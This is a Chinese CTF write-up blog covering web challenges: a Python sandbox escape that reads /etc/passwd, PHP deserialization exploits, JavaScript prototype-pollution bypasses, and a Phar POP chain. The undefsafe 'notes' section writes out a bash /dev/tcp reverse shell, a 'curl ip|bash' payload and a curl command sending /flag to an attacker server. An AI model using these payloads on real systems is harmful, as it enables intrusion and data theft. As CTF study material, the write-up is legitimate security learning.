'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'importlib._abc.Loader'&gt;, &lt;class 'importlib.util._incompatible_extension_module_restrictions'&gt;, &lt;class '_distutils_hack._TrivialRe'&gt;, &lt;class '_distutils_hack.DistutilsMetaFinder'&gt;, &lt;class '_distutils_hack.shim'&gt;]'''</span>data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span><span class="token string">"&gt;"</span><span class="token punctuation">)</span>userful_class <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'site._Printer'</span><span class="token punctuation">,</span><span class="token string">'linecache'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token punctuation">,</span><span class="token string">'os._wrap_close'</span><span class="token punctuation">,</span> <span class="token string">'subprocess.Popen'</span><span class="token punctuation">,</span> <span class="token string">'warnings.catch_warnings'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib._ModuleLock'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib._DummyModuleLock'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib._ModuleLockManager'</span><span class="token punctuation">,</span> <span class="token string">'_frozen_importlib.ModuleSpec'</span><span class="token punctuation">]</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"'(.*?)'"</span><span class="token punctuation">)</span>class_list <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">for</span> c <span class="token keyword">in</span> class_list<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> userful_class<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>            index <span class="token operator">=</span> class_list<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> c<span class="token punctuation">)</span> <span class="token comment">#一个筛选的脚本</span><span class="token triple-quoted-string string">'''116: _frozen_importlib._ModuleLock117: _frozen_importlib._DummyModuleLock118: _frozen_importlib._ModuleLockManager118: _frozen_importlib._ModuleLockManager119: _frozen_importlib.ModuleSpec120: _frozen_importlib.BuiltinImporter154: os._wrap_close162: warnings.catch_warnings'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token string">';import_ = ().__class__.__base__.__subclasses__()[120].load_module;_posixsubprocess = import_("_posixsubprocess");pipe = ().__class__.__base__.__subclasses__()[154].__init__.__globals__['</span>pipe'<span class="token punctuation">]</span><span class="token punctuation">;</span>_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">,</span><span class="token string">b"/etc/passwd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先酱吧，有缘再补</p><hr><p>可以我去搞一个dd然后再完善一些再试一遍，稍等<del>（但是好懒。。。有缘再说吧</del></p><hr><p>好像有两次，本次必做是否该叫unidecode专题（指指点点</p><p>还有两道以前发过</p><p>还是先把必做的发了吧<a href="https://qing777.pythonanywhere.com/%EF%BC%8C%E6%97%A0%E4%BA%8B%E4%B8%80%E8%BA%AB%E8%BD%BB%EF%BC%8C%E5%85%B6%E4%BB%96%E7%9A%84%E5%86%8D%E8%AF%B4%E5%90%A7%E3%80%82">https://qing777.pythonanywhere.com/，无事一身轻，其他的再说吧。</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其他题1（队）</title>
      <link href="/2025/01/30/zuo-ye/"/>
      <url>/2025/01/30/zuo-ye/</url>
      
        <content type="html"><![CDATA[<h3 id="网鼎杯-2020-青龙组-AreUSerialz1"><a href="#网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz1"></a>[网鼎杯 2020 青龙组]AreUSerialz1</h3><p><a href="https://">https://www.runoob.com/php/func-filesystem-file-put-contents.html</a></p><pre class="line-numbers language-none"><code class="language-none">《?phpinclude("flag.php");highlight_file(__FILE__);class FileHandler {    protected $op;    protected $filename;    protected $content;    function __construct() {#初始化并用process        $op = "1";        $filename = "/tmp/tmpfile";        $content = "Hello World!";        $this-&gt;process();    }    public function process() {#process根据$op的值决定是执行write方法（$op为"1"时）还是read方法（$op为"2"时），否则输出"Bad Hacker!"。        if($this-&gt;op == "1") {            $this-&gt;write();        } else if($this-&gt;op == "2") {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output("Bad Hacker!");        }    }    private function write() {#write将$content写入$filename指定的文件中，前提是$content长度不超过100个字符。        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {            if(strlen((string)$this-&gt;content) &gt; 100) {                $this-&gt;output("Too long!");                die();            }            $res = file_put_contents($this-&gt;filename, $this-&gt;content);#file_put_contents() 函数把一个字符串写入文件中。            if($res) $this-&gt;output("Successful!");            else $this-&gt;output("Failed!");        } else {            $this-&gt;output("Failed!");        }    }    private function read() {#read+output读取$filename指定文件的内容。        $res = "";        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;    }    private function output($s) {#输出        echo "[Result]: ";        echo $s;    }    function __destruct() {#销毁        if($this-&gt;op === "2")            $this-&gt;op = "1";        $this-&gt;content = "";        $this-&gt;process();    }}function is_valid($s) {    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))#检查输入字符串是否只包含ASCII码在32到125之间的字符。            return false;    return true;}if(isset($_GET{'str'})) {    $str = (string)$_GET['str'];    if(is_valid($str)) {        $obj = unserialize($str);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">《?phpclass FileHandler {    protected $op;    protected $filename;    protected $content;    function __construct() {        $this-&gt;op = 2;#还有就是是数字2不要加引号（**这里挺细节重要的的！！！**        $this-&gt;filename = "flag.php";        $this-&gt;content;#注意这里需要content为空（某人一开始忘改了    }}$a = new FileHandler;$result = serialize($a);echo $result;echo "\n";$result=str_ireplace('*','',$result);$payload=preg_replace('/[\x00-\x1F\x7F]/', '', $result);#某懒狗懒得手动换于是找了个不可见字符转化（echo $payload;#O:11:"FileHandler":3:{s:5:"  *  op";i:2;s:11:"  *  filename";s:8:"flag.php";s:10:"  *  content";s:10:"  *  content";N;}#对比后再手动改一下数字#O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>怎么[Result]:是空的（哭<br><del>好吧还得用伪协议</del><br><code>filename = 'php://filter/read=convert.base64-encode/resource=flag.php'</code><br><code>?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}</code><br>补一下：</p><blockquote><p>传参后会被反序列化，反序列化时会先调用 _destruct 方法，因为传入 op 为 “2” 时会先被 _destruct 方法变为 “1”，所以要实现读操作即 op == “2” 成立就要先绕过 _destruct的干扰， 。<br>注意实现读操作的 op == “2” 是弱类型比较，也就是这里 2 == “2” 是成立的，而 _destruct的 op === “2” 是强类型比较，在这里 2 === “2” 不成立，也就是绕过了_destruct的干扰。所以 op 为 2 时可以成功实现读操作。</p></blockquote><p>嘶，原来这里还有个弱类型绕过（<del>我说我怎么一开始构的payload都failed</del>，原来是少了一个重要细节！！！</p><hr><h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p><a href="https://">https://blog.csdn.net/qq_58784379/article/details/120169420</a><br><img src="https://pick.lwzheng.tech/2025/01/20/678ddd4b0c8ac.png" alt="1e2650f794aff362472e45a7b6ba71a5.png"></p><pre class="line-numbers language-none"><code class="language-none">《?phpclass xctf{    public $flag = '111';    public function __wakeup()    {        exit('bad requests');    }}$result=new xctf();$payload=serialize($result);echo $payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code><br>绕过<br><code>O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></p><hr><h3 id="wife-wife"><a href="#wife-wife" class="headerlink" title="wife_wife"></a>wife_wife</h3><p><del>所以题目是对妮露的表白吗~<br><img src="https://pick.lwzheng.tech/2025/01/20/678ddd5139a41.png" alt="929dfb099c8537adaaba77b766b315a4.png"><br>~~疑似夹带私货</del><br><img src="https://pick.lwzheng.tech/2025/01/22/67904064ece23.png" alt="aedbec89271ab55ddd0e913a36643954.png"><br>但我不会js呀（哭<br><a href="https://">https://xz.aliyun.com/t/10032?time__1311=Cqjx2DRii%3DwxlxGgOKGOKD8YGCDBimaDOYD</a><br><a href="https://">https://www.freebuf.com/articles/web/275619.html</a><br><a href="https://">https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%8E%9F%E5%9E%8B%EF%BC%88JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF%EF%BC%89</a><br><a href="https://">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign</a></p><blockquote><p>当我们谈到继承时，JavaScript 只有一种结构：对象。每个函数对象有 prototype 属性，而实例对象没有，但所有的实例对象（函数，数组，对象）都会初始化一个私有属性 <strong>proto</strong> 指向它的 构造函数的原型对象 prototype。该原型对象也有一个自己的原型对象 <strong>proto</strong>，层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。下面我们把构造函数、原型对象、以及实例对象的关系理清如下：</p><p>每个构造函数都有一个 prototype 原型对象<br>每个实例对象都有一个 <strong>proto</strong> 属性，并且指向它的构造函数的原型对象 prototype<br>对象里的 constructor 属性指向其构造函数本身<br>原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。<br>newClass 实例化的对象 newObj 的 .<strong>proto</strong> 指向 newClass 类的 prototype</p></blockquote><p><img src="https://pick.lwzheng.tech/2025/01/21/678fbe7a6b6c2.png" alt="5f1e06db25fd4bebb4c38c032247c556.png"><br>通过newObj.__proto===newClass.prototype将上级污染<br>源码：</p><pre class="line-numbers language-none"><code class="language-none">// post请求的路径app.post('/register', (req, res) =&gt; {     let user = JSON.parse(req.body)  // 把我们输入的账号密码，从json字符串转成对象     // 判断我们有没有输入账号和密码    if (!user.username || !user.password) {          return res.json({ msg: 'empty username or password', err: true })    }    // 判断账号是否存在总对象的username里，如果相同的username就是重复用户名了    if (users.filter(u =&gt; u.username == user.username).length) {          return res.json({ msg: 'username already exists', err: true })    }    // isAdmin是否true 与 邀请码是不是等于这个常量，所以sql注入没用，邀请码是个常量    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) {        user.isAdmin = false        return res.json({ msg: 'invalid invite code', err: true })    }     // 使用系统函数复制对象，打包成一个新的对象    let newUser = **Object.assign**({}, baseUser, user)//Object.assign() 方法只会拷贝源对象可枚举的的自有属性到目标对象。可以触发原型链污染    users.push(newUser)  // 存到总对象里    res.json({ msg: 'user created successfully', err: false })  // 设置返回信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>"__proto__":{"isAdmin":true}</code><br><img src="https://pick.lwzheng.tech/2025/01/21/678fc30fe42ca.png" alt="d5ed001bc9d0491262fd4aa0ba48d13c.png"><br>再登陆即可</p><hr><h3 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h3><p>依旧是这篇<a href="https://">https://xz.aliyun.com/t/10032?time__1311=Cqjx2DRii%3DwxlxGgOKGOKD8YGCDBimaDOYD#toc-14</a><br>有undefsafe() 函数解释（感觉这篇讲的挺好的</p><pre class="line-numbers language-none"><code class="language-none">var express = require('express');//&nbsp;require&nbsp;是一个用于引入模块的函数。&nbsp;express&nbsp;是一个流行的Web应用框架，用于快速搭建Web服务器和处理路由。var path = require('path');//&nbsp;path&nbsp;模块是Node.js内置的，用于处理文件路径相关的操作const undefsafe = require('undefsafe');//undesafe存在漏洞：当 undefsafe() 函数的第 2，3 个参数可控时，我们可以污染 object 对象中的值。const { exec } = require('child_process');//引入了Express框架、Node.js内置的&nbsp;path&nbsp;模块、&nbsp;undefsafe&nbsp;库（用于安全地访问对象属性）以及&nbsp;child_process&nbsp;模块中的&nbsp;exec&nbsp;方法（用于执行系统命令）。var app = express();//创建了一个Express应用实例class Notes {//定义了一个&nbsp;Notes&nbsp;类，用于管理笔记。包含了初始化方法、写入笔记、获取笔记、编辑笔记、获取所有笔记和删除笔记的方法。    constructor() {        this.owner = "whoknows";        this.num = 0;        this.note_list = {};    }    write_note(author, raw_note) {        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};    }    get_note(id) {//undefsafe        var r = {}        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    }    edit_note(id, author, raw) {//undefsafe        undefsafe(this.note_list, id + '.author', author);        undefsafe(this.note_list, id + '.raw_note', raw);    }    get_all_notes() {        return this.note_list;    }    remove_note(id) {        delete this.note_list[id];    }}//=&gt;寻找get_note与edit_notevar notes = new Notes();//创建了一个&nbsp;Notes&nbsp;类的实例，并写入了一条初始笔记。notes.write_note("nobody", "this is nobody's first note");app.set('views', path.join(__dirname, 'views'));//设置Express应用查找视图文件的目录，&nbsp;path.join&nbsp;用于拼接目录路径，&nbsp;__dirname&nbsp;表示当前文件所在的目录，这里表示视图文件存放在&nbsp;views&nbsp;文件夹下。app.set('view engine', 'pug');//设置应用使用的视图引擎为&nbsp;pug&nbsp;，这样Express在渲染视图时会使用&nbsp;pug&nbsp;的语法。app.use(express.json());//启用对JSON格式请求体的解析，这样在处理请求时，Express可以自动将JSON格式的请求体解析为JavaScript对象。app.use(express.urlencoded({ extended: false }));//启用对URL编码格式请求体的解析，&nbsp;extended: false&nbsp;表示使用简单的URL编码解析方式。app.use(express.static(path.join(__dirname, 'public')));//设置Express应用提供静态文件服务，将&nbsp;public&nbsp;文件夹下的文件作为静态资源对外提供访问。app.get('/', function(req, res, next) {//当用户访问根路径时，会执行这个函数  res.render('index', { title: 'Notebook' });//通过&nbsp;res.render&nbsp;方法渲染&nbsp;index.pug&nbsp;视图，并传递一个&nbsp;title&nbsp;参数，值为&nbsp;"Notebook"});app.route('/add_note')//定义了&nbsp;/add_note&nbsp;路径的路由    .get(function(req, res) {        res.render('mess', {message: 'please use POST to add a note'});//对于GET请求，返回一个提示信息，建议使用POST方法添加笔记    })    .post(function(req, res) {//从请求体中获取&nbsp;author&nbsp;和&nbsp;raw&nbsp;（笔记内容），如果都存在，则调用&nbsp;notes.write_note&nbsp;方法添加笔记，并返回添加成功(失败)的消息。        let author = req.body.author;        let raw = req.body.raw;        if (author &amp;&amp; raw) {            notes.write_note(author, raw);            res.render('mess', {message: "add note sucess"});        } else {            res.render('mess', {message: "did not add note"});        }    })app.route('/edit_note')//与&nbsp;/add_note&nbsp;路由类似    .get(function(req, res) {        res.render('mess', {message: "please use POST to edit a note"});    })    .post(function(req, res) {        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) {            notes.edit_note(id, author, enote);//找到，很好的小白鼠（            res.render('mess', {message: "edit note sucess"});        } else {            res.render('mess', {message: "edit note failed"});        }    })app.route('/delete_note')//与&nbsp;/add_note&nbsp;路由类似    .get(function(req, res) {        res.render('mess', {message: "please use POST to delete a note"});    })    .post(function(req, res) {        let id = req.body.id;        if (id) {            notes.remove_note(id);            res.render('mess', {message: "delete done"});        } else {            res.render('mess', {message: "delete failed"});        }    })app.route('/notes')    .get(function(req, res) {//GET请求，从请求的查询参数中获取&nbsp;q        let q = req.query.q;        let a_note;        if (typeof(q) === "undefined") {            a_note = notes.get_all_notes();        } else {            a_note = notes.get_note(q);//找到。 undefsafe第三个参数随第二个变化，无法控制        }        res.render('note', {list: a_note});//通过&nbsp;res.render&nbsp;方法渲染&nbsp;note.pug&nbsp;视图，并将获取到的笔记数据传递给视图。    })app.route('/status')    .get(function(req, res) {        let commands = {            "script-1": "uptime",//获取系统运行时间            "script-2": "free -m"//获取系统内存使用情况        };        for (let index in commands) {//通过&nbsp;for...in&nbsp;循环遍历命令对象，使用&nbsp;exec&nbsp;方法执行每个命令。遍历command!!!好的            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) =&gt; {                if (err) {//如果执行过程中出现错误，直接返回                    return;                }                console.log(`stdout: ${stdout}`);//将命令的输出打印到控制台=》会过command的原型（也是note_list的）            });        }        res.send('OK');        res.end();    })app.use(function(req, res, next) {//404  res.status(404).send('Sorry cant find that!');});app.use(function(err, req, res, next) {//500  console.error(err.stack);  res.status(500).send('Something broke!');});const port = 8080;//定义应用监听的端口为8080，调用&nbsp;app.listen&nbsp;方法启动Express应用。当应用成功启动后，会在控制台打印出应用的访问地址。app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ssh root@你的服务器</code><br>yum install httpd -y<br> systemctl start httpd<br>当然我用的finalshell<br>用的腾讯云，记得开一下自定义端口防火墙<br>可以用html<br><code> cd /var/www/html/</code><br><code> vim index.html</code><br><code>bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1</code><br>这是一个在类Unix系统中创建反向Shell的命令。&nbsp;bash -i&nbsp; 启动一个交互式的 &nbsp;bash&nbsp;  shell，&nbsp;&gt;&amp;&nbsp; 用于重定向标准输出和标准错误输出，&nbsp;/dev/tcp/ip/端口&nbsp; 是一个特殊的文件描述符，用于建立与 IP地址的 &nbsp;xxxx端口的TCP连接，&nbsp;0&gt;&amp;1&nbsp; 则将标准输入也重定向到这个连接上。这样，攻击者就可以通过监听该端口来获取服务器的Shell权限，完全控制服务器。<br><code>id=__proto__.aaa&amp;author=curl ip|bash&amp;raw=lalala;（注意POST+访问/edit_note)</code><br>将自定义属性 &nbsp;aaa&nbsp; 添加到对象的原型上。curl&nbsp; 是一个用于发送HTTP请求的工具，&nbsp;|&nbsp; 是管道符，它将 &nbsp;curl&nbsp; 命令的输出作为 &nbsp;bash&nbsp; 命令的输入。整体意图是通过 &nbsp;curl&nbsp; 从指定的ip地址下载内容，并在服务器上使用 &nbsp;bash&nbsp; 执行下载的内容。raw凑数的（源代码edit_note那里先执行的author,就用author了。感觉反过来用raw也行，但就这样吧）<br><code>undefsafe(this.note_list, id + '.author', author);</code>（着重写出来一下）=》污染note_list<br><img src="https://pick.lwzheng.tech/2025/01/23/6791217347f08.png" alt="5d4fa0b3ac3ac89a212b36ff01c8aa41.png"><br><img src="https://pick.lwzheng.tech/2025/01/23/6791211bd21fa.jpg" alt="a7b7e7b25ce861ecead5e5f69b763a02.jpg"><br>或者<br>上传一个shell.txt<br><code>vim（nano） shell.txt</code><br><code>bash -i &gt;&amp; /dev/tcp/主机/端口 0&gt;&amp;1</code><br><code>id=__proto__.bb&amp;author=curl -F 'flag=@/flag' ip:端口&amp;raw=a</code><br>&nbsp;curl -F&nbsp; 是用于发送表单数据的选项，&nbsp;‘flag=@/flag’&nbsp; 表示将服务器上 &nbsp;/flag&nbsp; 文件的内容作为名为 &nbsp;flag&nbsp; 的表单字段发送出去（污染的原理一样,但这个直接发flag了<br>这里改为<code>id=__proto__.abc&amp;author=curl%20http://ip/shell.txt|bash&amp;raw=a</code>也行，但这个跟第一个方法就一样了<br>监听<br><code> nc -lvvp 2333</code><br>访问 /status 路由<br><img src="https://pick.lwzheng.tech/2025/01/23/6791d8566b13f.png" alt="6efc983f85d7a8968bb97a4e2dca02a1.png"></p><hr><h3 id="Dest0g3-520迎新赛-PharPOP"><a href="#Dest0g3-520迎新赛-PharPOP" class="headerlink" title="[Dest0g3 520迎新赛]PharPOP"></a>[Dest0g3 520迎新赛]PharPOP</h3><p><a href="https://">https://www.cnblogs.com/bmjoker/p/13742666.html</a>（这篇写得不会的人也能看懂，写了phar、伪造、改签名等等，我便不再赘述了）<br><a href="https://">https://mp.weixin.qq.com/s/6O_Lodz1VW6Ua02YbyYH5w</a>（这篇写了phar绕过+gzip)<br>题目是phar_pop，用phar伪协议+pop链</p><pre class="line-numbers language-none"><code class="language-none">《?phphighlight_file(__FILE__);function waf($data){    if (is_array($data)){//检查输入的 &nbsp;$data&nbsp; 是否为数组        die("Cannot transfer arrays");    }    if (preg_match('/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i', $data)) {//检查是否有敏感字符串（不区分大小写        die("You can't do");//一堆限制，需用phar的方法    }//对传入数据进行waf(正则版），可以利用gzip压缩phar绕过waf函数过滤。（常）}class air{    public $p;    public function __set($p, $value) {//在给不可访问属性赋值时，即在调用私有属性的时候会自动执行        $p = $this-&gt;p-&gt;act;//从 &nbsp;$this-&gt;p-&gt;act&nbsp; 获取一个类名，然后使用这个类名创建一个新对象        echo new $p($value);//并将 &nbsp;$value&nbsp; 作为参数传递给该对象的构造函数，最后输出新创建的对象。    }}class tree{    public $name;    public $act;    public function __destruct() {//&nbsp;__destruct&nbsp; 魔术方法在对象被销毁时自动调用        return $this-&gt;name();//调用 &nbsp;$this-&gt;name&nbsp; 作为一个函数    }    public function __call($name, $arg){//在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法        $arg[1] =$this-&gt;name-&gt;$name;//将 &nbsp;$this-&gt;name&nbsp; 的 &nbsp;$name&nbsp; 属性值赋给 &nbsp;$arg[1]&nbsp;    }}class apple {    public $xxx;    public $flag;    public function __get($flag)//读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）    {        $this-&gt;xxx-&gt;$flag = $this-&gt;flag;//将 &nbsp;$this-&gt;flag&nbsp; 的值赋给 &nbsp;$this-&gt;xxx&nbsp; 的 &nbsp;$flag&nbsp; 属性。给不可访问属性赋值    }}class D {    public $start;    public function __destruct(){        $data = $_POST[0];//这里分割了一下        if ($this-&gt;start == 'w') {//检查，write            waf($data);            $filename = "/tmp/".md5(rand()).".jpg";//生成一个临时文件名            file_put_contents($filename, $data);//将 &nbsp;$data&nbsp; 写入该文件，**file_get_contents触发phar反序列化**            echo $filename;//输出文件名        } else if ($this-&gt;start == 'r') {//read            waf($data);            $f = file_get_contents($data);            if($f){                echo "It is file";            }            else{                echo "You can look at the others";            }        }    }}class banana {    public function __get($name){        return $this-&gt;$name;    }}// flag in /   （看来在根目录if(strlen($_POST[1]) &lt; 55) {    $a = unserialize($_POST[1]);}else{    echo "str too long";}throw new Error("start");//这也是个麻烦，利用PHP的GC机制绕过throw new Error("start");触发最开始的__destruct。将phar最后的}去掉来进行绕过。?&gt;//因为反序列化会触发对象的析构函数，从而绕过 &nbsp;waf&nbsp; 函数对直接输入数据的限制。Fatal error: Uncaught Error: start in /var/www/html/index.php:80 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 80我们需要找一个能表达出$a的：=》air的_set(最后一个）apple的_get可调用_set(给不可访问属性赋值)（倒二）tree的__call中$arg没初始化却要访问，可调用_get（倒三）tree的destruct中name()不存在，调用__call（倒四）destruct在对象被销毁时自动调用（第一个）tree的__destruct=&gt;tree的__call=&gt;apple的__get=&gt;air的__set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>理一下：写入寻找的码(glob)（w时）-&gt; pop输出+phar(gzip)绕过waf+GC绕过-&gt;phar伪协议读（r时)[post分为0（正<br>  文）和1（w/r)]</strong></p><pre class="line-numbers language-none"><code class="language-none">链接里有《?php    class TestObject {    }    @unlink("phar.phar");    $phar = new Phar("phar.phar");    $phar-&gt;startBuffering();    //设置stub，增加gif文件头    $phar-&gt;setStub("GIF89a"."");     $o = new TestObject();    $o-&gt;data = 'i am bmjoker';    //将自定义meta-data存入manifest    